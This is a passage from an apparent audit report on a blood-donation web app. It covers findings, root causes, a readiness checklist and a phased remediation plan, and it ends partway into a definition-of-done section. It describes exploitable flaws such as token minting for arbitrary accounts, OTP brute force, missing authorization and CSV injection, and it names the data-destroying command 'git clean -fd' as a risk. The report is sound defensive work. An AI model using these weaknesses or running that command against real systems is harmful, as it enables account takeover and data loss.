| **PERF-013** | **P3** | Perf | FE-106 | Hardcoded coordinates defeat geo-indexing | Fake data | Meaningless geo results | FE-031 |
| **BL-003** | **P1** | Business | DB-001/BE-102 | Blood-product expiry absent | Never modelled | Core safety control missing | — |
| **BL-004** | **P1** | Business | No reservation logic | — | — | — | DB-001 |
| **BL-005** | **P1** | Business | `DonationService.verifyDonation` | Fulfilment cascade missing | Field never modelled | — | DB-002 |
| **BL-006** | **P1** | Business/Compliance | No audit on donations | — | — | — | SEC-007 |
| **BL-007** | **P1** | Business | No hospital approval endpoint; `isVerified` never true | — | — | Credentialing impossible | FE-132 |
| **BL-008** | **P2** | Business | — | No admin role-assignment endpoint | Not implemented | Contradicts the spec (its absence is good for security) | — |
| **BL-009** | **P2** | Business | `SmsService.java` | SMS declared but never injected | Feature removed, artefacts kept | Spec'd SMS OTP absent | — |
| **BL-010** | **P2** | Business | — | Donation certificates/receipts absent | Not implemented | Spec feature missing | — |
| **BL-011** | **P2** | Business | — | No donor accept/decline | Not implemented | Spec feature missing | = BL-001 |
| **BL-012** | **P2** | Business | `AppointmentUpdateRequest` | No reschedule endpoint | Not implemented | Spec feature missing | = PH-027 |
| **BL-013** | **P2** | Business | `AppointmentStatus.NO_SHOW` | Never set | Not implemented | No-show analytics impossible | — |
| **BL-014** | **P2** | Business | `AvailabilityStatus` | Only 2 of 3 spec'd states (no "On Hold") | Incomplete enum | Spec feature missing | — |
| **BL-015** | **P2** | Business | — | No admin notification broadcast | Not implemented | Spec feature missing | — |
| **BL-016** | **P2** | Business | `AdminController.java:37` | No IP/actor audit filter | Not implemented | Spec feature missing | = SEC-007 |
| **BL-017** | **P2** | Business/DB | `hospitals` | Booleans instead of a status; `PENDING` unreachable | Model mismatch | Spec feature missing | = BL-007 |
| **BL-018** | **P3** | Docs | spec vs `enums/Urgency.java` | Backend added `CRITICAL`; spec and frontend not updated | Drift | Vocabulary divergence | = FE-011 |
| **BL-019** | **P3** | Docs/DB | `V3` vs spec §3 Entity 6 | Parent link is mandatory, spec says optional | Doc/impl mismatch | — | — |
| **BE-006** | **P3** | Build | `startup.log:35` | `Found 1 JPA repository interface` (10 exist) | **SUSPECTED** log-truncation | Needs verification | — |
| **AUTH-015** | — | Security | `SecurityConfig.java:35` | CSRF disabled — justified, not scored | Stateless + no cookies | Becomes a risk if cookies are introduced | SEC-010 |
| **GH-012** | — | Git | — | Secrets correctly **not** committed | Correctly handled | — | — |
| **GH-013** | — | Git | — | No large files committed | Healthy | — | — |
| **GH-014** | — | Git | — | Git history not modified | Per instruction | — | — |

### 20.1 Consolidated counts

| Severity | Count |
|---|---:|
| **P0** | **19** |
| **P1** | **88** |
| **P2** | **139** |
| **P3** | **35** |
| Informational / verified-clean | 4 |
| **TOTAL** | **285** |

---

## 21. Root Cause Analysis

### ROOT CAUSE 1 — Authorization was never treated as a first-class concern

**Affects:** SEC-001, SEC-004, BE-100, BE-104, BE-107, BE-110, BE-127, BE-130, AUTH-002, AUTH-011, AUTH-014, BE-152, API-008, and the entire §8.2 table (33 endpoint/verb pairs), plus SEC-008 (reachable only because `PUT /api/hospitals/{id}` is unauthorised).

**Causes:**
- Exactly **3** `@PreAuthorize` annotations exist in a 102-file backend, all on `/api/admin`.
- No ownership/tenancy abstraction. Three ad-hoc patterns coexist: class-level `@PreAuthorize`, method-level `@PreAuthorize`, and hand-rolled `if (role != X) throw` inside services. No single auditable policy location.
- Services that *do* implement a check (`DonationService.verifyDonation`, `AppointmentService.ensureHospitalOrAdmin`, `NotificationService.markAsRead`) are the exception, and even they leak via BE-140 (403 becomes 500).
- The frontend's `RoleRoute` guards create a false sense of coverage: the UI hides admin pages, so the absence of server-side checks is invisible during manual QA.
- Zero authorization tests, so a `curl` with a donor token is the only way to discover any of it.

**Impact:** Any authenticated user — including a self-registered donor — can forge donations, rewrite hospital blood stock, edit any hospital, overwrite any donor's GPS, read any donor's health data, and complete/cancel/fulfil any appointment, donation, or blood request. A donor can manufacture or destroy the blood supply of every hospital on the platform with no audit record.

**Recommended architectural fix:**
1. Apply `@PreAuthorize` at the **service** layer as the default, not the exception (method security is already enabled via `@EnableMethodSecurity`).
2. Build a small `AuthorizationGuard` component with explicit methods — `requireSelfOrAdmin(UUID actorId, UUID ownerId)`, `requireHospitalOwner(UUID actorId, UUID hospitalId)`, `requireRole(Role…)` — so every ownership rule is written once and unit-testable.
3. Adopt repository query methods that **express the constraint in the query** (`findByIdAndHospitalUserId(UUID id, UUID userId)`) rather than `findById` + Java-side comparison. A wrong check then yields an empty `Optional` (→404) rather than a leak.
4. Add a `ResourceOwnershipIT` test class that, for **every** mutating endpoint, asserts 403 for a non-owner and 2xx for the owner. This is the single highest-value test investment in the project.
5. Add `@ExceptionHandler(ForbiddenException.class)` returning 403 **first**, so denials are observable.

---

### ROOT CAUSE 2 — The API contract is duplicated by hand on both sides and never verified

**Affects:** FE-010 (P0), FE-100/101/102 (P0), FE-011, FE-013, FE-014, FE-015, FE-107, FE-108, FE-109, FE-110, FE-111, FE-017, FE-018, FE-019, FE-020, FE-021, FE-022, FE-023, CQ-005, CQ-006, API-017, and the entire `contracts.ts` file.

**Precise mechanism (the key refinement):** **7 adapters normalise their responses; 5 do not.**

| Normalised (7) | NOT normalised (5) |
|---|---|
| `bloodRequestApi`, `emergencyApi`, `appointmentApi`, `inventoryApi`, `donationApi`, `contributionApi`, `notificationApi` | `adminApi`, `analyticsApi`, `matchingApi`, `userApi`, `hospitalApi.bloodRequests` |

**Every field-mismatch bug lives in the second group.** The `asEnumValue(value, [...literals], fallback)` helper then **silently substitutes the fallback** (FE-025), so the drift produces wrong data on screen rather than an error.

**Causes:**
- `contracts.ts` defines 18 TypeScript interfaces that mirror the Java DTOs **by convention only**. Nothing generates, shares, or validates them.
- Per-adapter hand-written coercion with inline literal arrays — the 8-element blood-group array is copy-pasted into 6 adapters (CQ-006), which is precisely why the enum drifts were never caught in one place.
- No contract test, no OpenAPI client generation, no shared schema.
- The **mock layer is shaped to the frontend's contract, not the backend's** (AnalyticsPayload `{series, breakdown}`), so mock mode shows working charts while real mode shows four empty ones. The mocks actively conceal the defect.

**Impact:** Password reset is 100% broken (P0). Three admin pages do not function (P0). Emergencies display as "Normal". Inactive users display as "Active". Suspended hospitals display as "ACTIVE". Matched donors display as "BUSY" with a fabricated distance. Eight notification types render as "System". Every admin report filter is silently ignored. The leaderboard's total-units column is always 0. The audit-log page 400s on every load. **None of this throws; all of it is wrong on screen.**

**Recommended architectural fix:**
1. Treat the backend's `/v3/api-docs` (already served, `permitAll`) as the contract source of truth and **generate** the TypeScript types and API client from it (`openapi-typescript` + a thin fetch wrapper). Delete the 18 hand-written interfaces.
2. Add normalisers to the 5 un-normalised adapters (a ~1-day mechanical change that closes 6 P1s: FE-107/108/109/110/111 + FE-100).
3. Replace the 8 copy-pasted blood-group arrays with one exported `const BLOOD_GROUPS = [...] as const` derived from a single enum definition.
4. Make `asEnumValue` **throw** (or return a discriminated result) on an unrecognised value in development; add a build-time strict mode that fails on contract drift.
5. Delete the silent `??` fallbacks that fabricate business data (`?? 1` unit, `?? 'Ahmedabad'`, `?? '1234567890'`, `?? 23.0225`, `?? 65` kg) — required fields must be required.
6. Realign the mock layer to the **real** response shapes so mocks stop concealing defects.

---

### ROOT CAUSE 3 — Unfinished work is expressed as fake success, not as failure or markers

**Affects:** BL-001, BL-002, BE-100, BE-101, BE-102, BE-124, BE-126, PH-001…PH-041, and the 22 dead frontend exports.

**Causes:**
- There are **no `TODO`/`FIXME` markers anywhere.** Unfinished work is instead represented by (a) empty `@Component`/`@Service`/`@RestControllerAdvice`-adjacent files that compile cleanly, and (b) service methods that validate their inputs, then return a hardcoded success payload.
- `notifyDonor` and `alertDonors` are the clearest examples: both look up the entities (so they "work"), then return a fabricated `"NOTIFICATION_DISPATCHED"` / `"broadcast dispatched"` response.
- The frontend does the same: a contact form that fires `toast.success` with no API call (FE-133), a licence upload that discards the file behind a green "success" chip (FE-132), a "PDF" export that writes CSV bytes (FE-114), and 7 accessibility primitives built and never wired.
- Because the return types are `Map<String,Object>` / `void` and the HTTP status is 200, **no test, type check, or compile step can detect any of this.** The frontend faithfully renders "success".

**Impact:** The two headline features — alerting matched donors and broadcasting emergencies — **do not exist**, while the application and the emergency modal both tell the user they succeeded. In a blood-request context this is the most dangerous class of defect in the codebase, because it suppresses the human escalation that would otherwise occur when the automation fails.

**Recommended architectural fix:**
1. **Ban fake-success returns.** `notifyDonor`/`alertDonors` must either call a real `NotificationGateway` or throw `UnsupportedOperationException`. If a capability is absent, the API must say so.
2. Add a `capabilities` concept: an explicit registry of implemented vs. unimplemented operations, surfaced in the admin UI, so "not built" is visible to operators rather than hidden behind a 200.
3. Delete the 13 empty files or fill them. An empty `AuditAspect.java` reads as "audit is implemented" to any reviewer or tool.
4. Adopt a `TODO(issue-url)` convention enforced by a lint rule, so gaps are greppable.

---

### ROOT CAUSE 4 — Untestable by construction, so untested

**Affects:** The whole of §14; and as the *enabler* of every other root cause.

**Causes:**
- **Backend:** no embedded database (BE-002) → the only integration test requires a developer's local PostgreSQL → it fails for unrelated reasons (BE-001) → the suite is not trusted → it is not extended.
- **Frontend:** no `msw`/fetch mock exists, so no frontend test *can* test a network path. This is why the only integration test had to hit a live server (FE-119). The 4 committed test files assert Zod schema behaviour and render smoke-tests. `frontend.integration.test.ts` is excluded from `npm test` and its runner script is broken.
- No coverage tooling (no JaCoCo, no Istanbul, no thresholds) → no objective signal.
- No fixtures, no test profile, no `src/test/resources`.
- The only meaningful-looking test, `InMemoryOtpStoreTest`, tests an **orphan package** — giving false confidence in exactly the area where the P0s live.
- `@testing-library/user-event` is installed but never used.

**Impact:** 16 tests total. **Zero** coverage of authorization, OTP verification, business rules, controllers, error handling, migrations, API adapters, HTTP interceptors, and `AuthContext` — i.e. zero coverage of every P0 and P1 in this report. A single `@WithMockUser(roles="DONOR")` + `MockMvc` test on `POST /api/donations` would have caught a P0. A single mocked-401 axios test would have caught FE-040. A single `resetPassword` contract test would have caught FE-010.

**Recommended architectural fix (in strict order):**
1. **Make the suite runnable**: add Testcontainers PostgreSQL; add `src/test/resources/application-test.yml`; run `mvn clean test` until green. *Nothing else matters until the tests execute.*
2. **Delete** `InMemoryOtpStoreTest` (dead code) and replace it with tests for `EmergencyEmailOtpService` covering the attempt-counter durability bug (SEC-003) — **write that test first, confirm it fails, then fix.**
3. Add `ResourceOwnershipIT` (Root Cause 1) as the highest-value security test.
4. Add `msw` + a `contracts.test.ts` asserting each adapter's normaliser against a **captured real backend response fixture** — this catches the whole field-mismatch class (Root Cause 2).
5. Add JaCoCo + coverage thresholds; wire both into CI.
6. Add Playwright for the three golden paths: donor registration → availability; requester → create request → view matches; hospital → verify donation → stock increments.

---

### ROOT CAUSE 5 — No delivery pipeline, so no quality gate has ever existed

**Affects:** DO-001…DO-020, GH-001…GH-004, and the fact that BE-001 (a red build) went unnoticed.

**Causes:**
- No CI, no containerisation, no health check, no README, no LICENSE.
- **The entire backend is untracked** (GH-001) and 130 frontend files are uncommitted (GH-002) — so there is no baseline, no review surface, and no history to bisect.
- `mvnw test` currently exits 1. Nobody is running it.

**Impact:** Every defect in this report was shippable because nothing mechanically prevented it. A single CI workflow running `mvn clean verify` + `tsc -b` + `eslint` + `vitest run` would have caught BE-001, and a dependency scan would have flagged the stale `package.json` (GH-005).

**Recommended architectural fix:**
1. **Commit the backend.** Immediately. Nothing else matters until the code is safe from `git clean`.
2. Add a GitHub Actions workflow: backend `mvn clean verify` (with a Testcontainers service) and frontend `npm ci && tsc -b && eslint . && vitest run && npm run build`, plus `npm audit --omit=dev --audit-level=high` and OWASP dependency-check.
3. Add a `Dockerfile` (multi-stage) per service and a `docker-compose.yml` with PostgreSQL, so "run it locally" is one command and CI is the same image.
4. Add `spring-boot-starter-actuator` and expose `/actuator/health` with a liveness/readiness probe.
5. Write the `README.md` (setup, env vars, ports, first-admin bootstrap) and a `LICENSE`.

---

### ROOT CAUSE 6 — Configuration is treated as code, but there is no configuration

**Affects:** DO-008, DO-009, DO-010, DO-011, BE-005, BE-132, AUTH-010, AUTH-016, BL-009.

**Causes:**
- `application-dev.yml` and `application-prod.yml` are both 0 bytes. All "production" behaviour is expressed as ad-hoc `@Profile("!dev & !test")` annotations scattered across 6 classes.
- Provider classes are **intentionally unimplemented and throw**: `UnconfiguredProductionEmailService`, `UnconfiguredProductionSmsService`, `SharedOtpStore`. The dev equivalents require a flag that defaults to `false`.
- The net result is a configuration matrix in which **no combination of settings produces a working feature set** — and the failures surface as 400 "not configured" blaming the user's input.
- Two competing `.env` mechanisms (`loadEnv()` in `main()` and `spring.config.import`) with different failure semantics, one of which silently swallows all exceptions.
- `.env.example` ships a `JWT_SECRET` that crashes the app.

**Impact:** The emergency SOS, password reset, and SMS features are non-functional in every configuration. An operator following the documented setup gets an opaque `WeakKeyException`. The backend cannot be started deterministically in any environment.

**Recommended architectural fix:**
1. Author real `dev` / `test` / `prod` profiles with all environment-specific values in one reviewed place.
2. **Fail fast at startup**: validate required configuration in an `EnvironmentPostProcessor` or `@PostConstruct` and abort with a single actionable message listing what is missing. Never defer to a per-request `BadRequestException`.
3. Delete `loadEnv()`; rely solely on `spring.config.import` (or a real secret manager). This also removes the BE-001 confounder.
4. Generate a valid `JWT_SECRET` in `.env.example` via a comment, and validate the length at startup.
5. Decide the email/SMS provider story: either implement one or remove the interfaces, so the codebase stops advertising capabilities it does not have.

---

## 22. Production Readiness Checklist

```
[ ] Build            Backend compiles, but `mvn test` EXITS 1 (BE-001/BE-002) and the
                     app cannot start on the existing DB (BE-003). The frontend builds
                     clean but emits a 1,105 kB single chunk (PERF-007).
[ ] Tests            16 tests total; 1 backend test FAILS; the only OTP test targets
                     an orphan package; ZERO coverage of authorization, business
                     rules, controllers, migrations, API adapters, or interceptors;
                     no E2E; no coverage tooling. Every P0/P1 here is undetected.
[ ] Authentication   Register/login/refresh work in the happy path only. But a
                     refresh token is a valid access token (SEC-002); password reset
                     is non-functional end-to-end (FE-010 + no email provider);
                     there is no revocation (AUTH-003); access tokens live 24 h
                     (AUTH-004); refresh tokens are not rotated (AUTH-005); `login()`
                     skips the blocked-user check (AUTH-006); the Firebase path 500s
                     (AUTH-016).
[ ] Authorization    FUNDAMENTALLY BROKEN. 3 @PreAuthorize in the whole backend;
                     33 endpoints have no role or ownership check; one permit-all
                     endpoint yields tokens for arbitrary accounts (SEC-001);
                     any user can rewrite blood stock (SEC-004) and forge donations
                     (BE-104); `PATCH /appointments/{id}/complete` has no principal;
                     a legitimate denial returns HTTP 500 (BE-140).
[ ] Security         No rate limiting anywhere (SEC-005); no CSP (SEC-011); raw
                     exception messages to clients (SEC-006); CSV formula injection
                     in all 7 exports (SEC-008); tokens in localStorage (SEC-010);
                     secrets in a plaintext file on disk (SEC-009); IP-based limits
                     unsound behind a proxy (SEC-012); Swagger public in prod
                     (SEC-013).
[ ] Database         FKs, CHECKs, and 30+ indexes are genuinely good. But the app
                     cannot migrate (BE-003); no pagination (API-001); no optimistic
                     locking (DB-004); no index on the SEC-001 hot path (DB-005); no
                     `units_fulfilled` (DB-002); no `expiry_date`/`reserved_units`
                     (DB-001); V6 is an empty migration (DB-011); no retention
                     policy (DB-013).
[ ] API              No versioning (API-002), no pagination (API-001), no rate
                     limiting (API-003), no idempotency (API-004); contract drift has
                     broken password reset (FE-010) and 3 admin pages (FE-100/101/102)
                     outright, and silently corrupted 5 enums and 5 field mappings.
[ ] Frontend         Compiles, lints, and tests clean. But 1,105 kB un-split bundle;
                     3 admin pages non-functional; enum + field drift silently
                     degrades 9+ UI surfaces; hardcoded fake data submitted to the
                     real backend from 6 sites; the 401-refresh path can never fire
                     (FE-040); logout does a full page reload (FE-041); no deep-link
                     restore (FE-048); no request timeout (FE-044); the SOS modal
                     leaks PII between opens (FE-122).
[ ] Error handling   ForbiddenException returns 500 (BE-140); 7+ common Spring
                     exceptions unhandled (BE-143); raw messages leaked (BE-141);
                     ZERO logging in the handler (BE-142); two empty catch blocks
                     turn a DB outage into a 401 (BE-144).
[ ] Logging          8 log statements in the entire backend; zero in the exception
                     handler. No correlation IDs, no structured logging, no audit of
                     anything that matters (SEC-007). Audit IPs are fabricated (BE-126).
[ ] Monitoring       NONE. No actuator, no /health, no metrics, no tracing, no
                     alerting, no dashboards (DO-006, DO-013).
[ ] Environment      No configuration exists in which the documented feature set
                     works (DO-010, Root Cause 6). The default profile throws for
                     email, OTP, and SMS; a dev profile with defaults fails to start.
                     The committed .env omits EMAIL_OTP_ENABLED and MAIL_USERNAME
                     (DO-008), and copying .env.example crashes on a weak JWT key
                     (DO-009).
[ ] Docker           ABSENT. No Dockerfile, compose, or k8s manifests (DO-002).
[ ] CI/CD            ABSENT. No pipeline has ever existed (DO-001). The build is red
                     and nobody is running it.
[ ] Documentation    No README, no API docs, no architecture doc, no runbook
                     (GH-003). HELP.md is Initializr boilerplate and is itself
                     gitignored. The one substantial document (the spec matrix) is
                     untracked and contradicts the implementation in 19 places
                     (BL-001…BL-019).
[ ] Backup/recovery  NONE. No dump/restore procedure, no PITR, no RPO/RTO, no
                     migration rollback plan (DO-014). All 9 migrations are up-only.
[ ] Performance      Zero pagination on every endpoint (PERF-001); N+1 in the
                     leaderboard, matching, and every response mapper (PERF-002/003/
                     006); all admin analytics and CSV reports load full tables
                     (PERF-005); 1,105 kB JS bundle (PERF-007).
[ ] Legal            No LICENSE on a public repository (GH-004).
```

**Score: 0 of 19 categories are production-ready.**

The two that come closest are **Database** (sound DDL, wrong lifecycle) and **Frontend** (clean toolchain, wrong data — and three pages that do not function).

---

## 23. Recommended Fix Order

Dependency-aware. Ordered by severity × blast radius × prerequisite, not by personal preference.

### PHASE 0 — Preserve the work (do this first, before anything else)

*Rationale: DO-003 means a single `git clean -fd` destroys the entire backend. Every subsequent phase depends on the code surviving.*

1. `git add -A` the backend and commit it. **GH-001 / DO-003.**
2. Commit the 130 modified frontend files. **GH-002 / DO-004.**
3. Add `README.md` and `LICENSE`. **GH-003, GH-004.**
4. Delete the stray `Red-Pulse Backend/red-pulse/package.json` + lock. **GH-005.**
5. Delete the 3 unused tracked assets. **GH-006.**

### PHASE 1 — Close the authentication/authorization holes (P0; everything else is unsafe until these are done)

1. **SEC-001** — remove JWT minting from `/api/emergency/verify-and-dispatch`; never resolve an existing account from a client-supplied phone or email. Add an `isActive`/status check. *(Highest blast radius: unauthenticated admin takeover.)*
2. **SEC-003** — move the OTP attempt increment to `REQUIRES_NEW` (or a native `UPDATE`) so it survives the rollback. **Write the failing test first.** *(Removes the brute-force path to #1.)*
3. **SEC-004** — `@PreAuthorize("hasRole('HOSPITAL')")` + `hospital.user.id == currentUserId` on all three inventory mutations. *(Clinical safety.)*
4. **BE-104** — take `@AuthenticationPrincipal` on `POST /api/donations`; force `donorId = currentUser.getId()`; derive `bloodGroup` from the donor profile; enforce role/eligibility.
5. **AUTH-001 / SEC-002** — add a mandatory `typ` claim; reject mismatches in the filter and in `refreshToken`.
6. **BE-130** — add `@AuthenticationPrincipal` to `PATCH /appointments/{id}/complete` and enforce hospital-or-admin.
7. **BE-140** — add `@ExceptionHandler(ForbiddenException.class)` → 403. *(One line; makes all remaining denials observable.)*
8. Sweep the remaining ~30 unauthorised endpoints per §8.2 using the `AuthorizationGuard` pattern (Root Cause 1).
9. **SEC-005** — add rate limiting (Bucket4j) with separate budgets for auth, OTP, and reads.
10. **BE-143 / BE-144** — add the missing exception handlers; stop swallowing exceptions in `JwtAuthenticationFilter` (log them).

> **Exit criterion for Phase 1:** every endpoint in §8.2 has an explicit, test-covered authorization decision; SEC-001/002/003/004 are closed and regression-tested.

### PHASE 2 — Security hardening (P1; depends on Phase 1 for the audit trail)

1. **SEC-007 / BE-126** — implement the AOP audit aspect; derive the real IP from `WebAuthenticationDetailsSource`; make `audit_logs` append-only. *(Without this, Phase 1's fixes are unobservable.)*
2. **SEC-006 / BE-141** — stop returning `getMessage()`; log with a correlation ID and return a generic message.
3. **BE-142** — add logging to `GlobalExceptionHandler`.
4. **SEC-008 / API-007** — sanitise and RFC-4180-quote all CSV fields.
5. **SEC-013 / API-005** — gate Swagger on the `dev` profile.
6. **SEC-011** — add a strict CSP, `Referrer-Policy`, `Permissions-Policy`; self-host fonts to remove the third-party script surface (**FE-053**).
7. **SEC-010** — move the refresh token to an `httpOnly; Secure; SameSite=Strict` cookie; keep the access token in memory. *(Requires Phase 1 #5 and re-introducing CSRF tokens — see AUTH-015.)*
8. **SEC-012** — set `server.forward-headers-strategy` and use the forwarded address.
9. **SEC-009** — fail fast on a missing/short `JWT_SECRET`; move secrets to a secret manager.
10. **API-006 / FE-114** — set `Content-Disposition` and `charset` on all 7 exports; stop offering PDF.

### PHASE 3 — Make the build green and the pipeline exist (P0/P1; unblocks CI for all later phases)

1. **BE-001** — `mvn clean`; add a clean-plugin execution bound to `test`; add a complete `src/test/resources/application-test.yml` so no stale file can shadow config.
2. **BE-002** — add Testcontainers PostgreSQL; make `contextLoads` hermetic.
3. **BE-003** — `flyway repair` on the dev DB; add `flyway validate` to CI; adopt immutable migrations.
4. **DB-011** — resolve the empty `V6` migration (restore or renumber).
5. **DO-001** — GitHub Actions: `mvn clean verify` + `tsc -b` + `eslint` + `vitest run` + `npm run build` + `npm audit --omit=dev --audit-level=high` + OWASP dependency-check.
6. **DO-002 / DO-006** — `Dockerfile` per service + `docker-compose.yml`; add `spring-boot-starter-actuator` and `/actuator/health`.
7. **DO-013** — structured logging with correlation IDs; graceful shutdown (**DO-012**).

> **Exit criterion:** a clean clone builds, tests, and runs green with one command, and no commit can land with a red build.

### PHASE 4 — Contract integrity and real-mode frontend breakage (P0/P1)

1. **FE-100** — send a valid `action` to `/api/admin/audit-logs/filter`, or make the backend parameter optional. *One-line fix; restores the whole page.*
2. **FE-010** — rename the reset field to `newPassword` (or change the DTO). *Quickest possible P0 fix.*
3. **FE-101 / FE-102** — align `AnalyticsOverview` with `AdminDashboardResponse`, and either reshape the four analytics endpoints to `{series, breakdown}` or rewrite the charts to read the flat maps. *Also fix the mock-concealment problem by realigning the mocks to the same contract.*
4. **Root Cause 2 (mechanical)** — add normalisers to the 5 un-normalised adapters (`adminApi`, `analyticsApi`, `matchingApi`, `userApi`, `hospitalApi.bloodRequests`), closing FE-107/108/109/110/111. Then generate types from `/v3/api-docs` and delete the 18 hand-written interfaces.
5. **FE-030 / 031 / 032 / 103 / 104 / 105 / 106 / 116** — delete every hardcoded fallback that reaches the real backend; make `isEligible` a strict `=== true`; remove the fabricated `65 kg / 25 yrs / 56 Days` biometrics and the fake landline.
6. **FE-112** — scope `HospitalDonationsPage` to the authenticated hospital.
7. **FE-119** — remove the real-backend credentials and data writes from `frontend.integration.test.ts`; add `msw` and rebuild it against mocks.
8. **FE-126** — add `onError` to the appointment confirm/complete/cancel mutations. *A silently failed donation verification is a patient-safety issue, not a UX nit.*
9. **FE-113** — add `key`/`reset()` to `InventoryModal` and `AppointmentModal`.
10. **FE-122** — give the SOS modal dialog semantics, Escape, a focus trap, and reset its state on close.
11. **FE-121 / FE-120** — wire the existing `Switch` component and give every filter `<select>` an accessible name.
12. **BE-004** — verify/align springdoc with Boot 4.

### PHASE 5 — Data integrity and concurrency (P1; depends on Phase 3 for a safe migration path)

1. **DB-004** — add `@Version` to `BloodInventory`, `Donation`, `DonorProfile`; handle `OptimisticLockException`.
2. **BE-105** — re-verify donation completion under lock; make the operation idempotent.
3. **BE-103** — guard `cancelDonation` with a state machine; implement compensating inventory reversal.
4. **BE-118** — replace the `default → SET` with an explicit enum and a 400 on an unknown action.
5. **BE-119 / BE-120** — lock the inventory read-modify-write; pre-check the blood-group uniqueness.
6. **DB-005 / DB-006** — add the missing indexes.
7. **BE-109** — validate future dates; detect appointment conflicts unconditionally.
8. **BE-110** — derive the donation blood group server-side.
9. **BE-106 / BE-107** — pick ONE eligibility implementation; delete `UserService`; **enforce eligibility in `updateAvailability`** (this is the live safety gap).
10. **BE-111 / DB-007 / DB-008** — reconcile DDL defaults and nullability with the entities.
11. **BE-114 / BE-115** — add the missing unique pre-checks so 500s become 409s.

### PHASE 6 — Restore the missing domain features (P1)

1. **BL-001 / BE-100, BL-002 / BE-101** — implement real donor notification and emergency broadcast, **or make them throw**. Remove the fake-success responses. *(Requires a real `SmsGateway`/push provider — see Root Cause 6.)*
2. **BE-102 / DB-001** — add `expiry_date` + `reserved_units`; implement `getExpiringUnits`; implement reservation (BL-003, BL-004).
3. **DB-002 / BL-005** — add `units_fulfilled`; cascade it from `verifyDonation`; implement the `PENDING→MATCHED→PARTIALLY_FULFILLED→FULFILLED` state machine with authorisation.
4. **BL-006 / SEC-007** — audit every donation completion and stock adjustment.
5. **BL-007** — implement hospital approval/verification; make `is_verified` settable.
6. **BE-113** — add an email-verification flow, or stop marking donors verified at registration.

### PHASE 7 — Performance (P1/P2; safe after Phase 5, since some fixes change the queries)

1. **API-001 / PERF-001** — add `Pageable` to every list endpoint; make the frontend's `page`/`size` real (**FE-022, FE-125, PH-004**).
2. **PERF-002** — aggregate the leaderboard in one query with `JOIN FETCH`.
3. **PERF-003 / DB-005** — push blood-group/availability/radius filtering into SQL (ideally PostGIS).
4. **PERF-005** — aggregate admin analytics in SQL; stream CSV with `StreamingResponseBody`.
5. **PERF-006** — `JOIN FETCH` / `@EntityGraph` on all list finders.
6. **PERF-007 / FE-049 / FE-002** — `React.lazy` the routes; `manualChunks` for `recharts`; add a bundle budget.
7. **PERF-004 / DB-003** — add `donor_profiles.total_donations`; stop rescanning donations.
8. **PERF-008–013** — the remainder.

### PHASE 8 — Frontend correctness, accessibility, and UX (P2)

1. **FE-040** — register a 401 `AuthenticationEntryPoint` on the backend so the refresh interceptor can work.
2. **FE-041 / FE-043** — replace `window.location.assign` with router navigation; exclude `/api/auth/login` from the 401 handler.
3. **FE-044** — add an axios `timeout` and abort plumbing.
4. **FE-045 / FE-046** — unwrap blob error responses; stop rendering raw server messages.
5. **FE-047** — fix the `useListParams` stale closure and `draft` resync.
6. **FE-048** — consume `state.from` for post-login redirect.
7. **FE-042** — use `STORAGE_KEYS` everywhere.
8. **FE-117** — fix the `<button><Link>` nesting on the 404 page.
9. **FE-127 / FE-144** — add `disabled`/loading states and real `Promise.reject(new Error(...))` reasons.
10. **FE-128 / FE-029** — wire `error` states and discriminate 401/403/500 in the hospital pages.
11. **FE-131 / FE-136 / FE-146** — tighten the register schema to match the UI labels; associate errors with inputs; label every filter.
12. **FE-051 / FE-052** — `||` for the env fallback; use the date helpers everywhere (**FE-142**).
13. **FE-060 / FE-061 / FE-062 + DO-016 / GH-010 / GH-011** — fix all mojibake; add `.editorconfig` and a root `.gitattributes` with `charset=utf-8` to stop it recurring.
14. **FE-139 / CQ-008** — add nav entries for the 2 orphaned pages; de-duplicate the 4 notifications pages.

### PHASE 9 — Testing (P1; must be built alongside Phases 1–8, not after)

1. **BE-001 / BE-002** first — nothing runs until these are fixed.
2. `ResourceOwnershipIT` — every mutating endpoint, non-owner → 403, owner → 2xx. *The single highest-value test.*
3. `EmergencyEmailOtpServiceTest` — attempt-counter durability (SEC-003), rate limits, expiry, single-use, and that a phone number belonging to an ADMIN cannot obtain tokens (SEC-001).
4. `AuthServiceIT` — blocked-user login (AUTH-006), refresh rotation/reuse (AUTH-005), reset end-to-end (FE-010).
5. `InventoryServiceTest` — ADD/DEDUCT/SET, unknown action (BE-118), concurrency (BE-119).
6. `DonationServiceIT` — the full lifecycle including "cannot cancel COMPLETED" (BE-103).
7. `FlywayMigrationTest` — migrate a clean schema, then `ddl-auto: validate`. Catches DB-007/008.
8. Add `msw` + `contracts.test.ts` asserting each adapter's normaliser against captured real responses. Catches the whole field-mismatch class.
9. `axios.test.ts` — 401→refresh→replay, dedup, `_retry` guard, `isRefreshCall` guard, timeout.
10. `AuthContext.test.tsx` — bootstrap, refresh-on-boot, logout, `loading` transitions.
11. Adopt `@testing-library/user-event` (FE-145) for login, register, and the 4 hospital appointment actions (FE-126/127).
12. Add JaCoCo + coverage thresholds; wire both into CI.
13. Playwright for the three golden paths (donor availability; requester create-request → matches; hospital verify-donation → stock increments).

### PHASE 10 — Documentation, spec reconciliation, and cleanup (P2/P3)

1. `README.md` — setup, env vars, ports, first-admin bootstrap, the Testcontainers requirement.
2. Reconcile `ROLES_AND_ENTITIES_WORKFLOW_MATRIX.md` with reality: either implement BL-001…BL-019 or mark them explicitly "Not implemented" with tracking issues. **A spec that claims 19 unimplemented features is worse than no spec** — it currently makes the codebase look complete.
3. Implement `OpenApiConfig` (PH-010) so `/v3/api-docs` carries security schemes and tag grouping.
4. Delete the 13 empty files, the dead `UserService`, the dead `auth/Entity/Role`, the dead `common/otp` package, and the dead SMS interfaces (PH-001…PH-025).
5. Delete the 22 dead frontend exports and wire or remove the 7 accessibility primitives.
6. Pin Node (`packageManager`/`engines`/`.nvmrc`); pin the Maven wrapper in git.
7. Document the deliberate security decisions in code: CSRF-off rationale (AUTH-015), `localStorage` trade-off, the bootstrap-admin path.

---

## 24. Definition of Done

Red Pulse may reasonably be called production-ready when **all** of the following are objectively true.

### Build, delivery, and repository
- [ ] `mvn clean verify` passes from a clean clone with **zero** manual steps and **no** local database.
- [ ] `npm ci && npm run build` passes from a clean clone, with `VITE_API_BASE_URL` supplied by the environment.
- [ ] The entire backend **and** frontend are committed; `git status` is clean; the working tree is reproducible from history alone.
- [ ] A CI pipeline runs on every push and cannot be bypassed; it gates build, test, lint, type-check, bundle budget, and dependency scanning.
- [ ] Multi-stage `Dockerfile` per service + `docker-compose.yml` bring the full stack up with one command.
- [ ] `/actuator/health` (liveness + readiness) exists and is wired to the container/orchestrator probe.
- [ ] `README.md` and `LICENSE` are present.

### Security
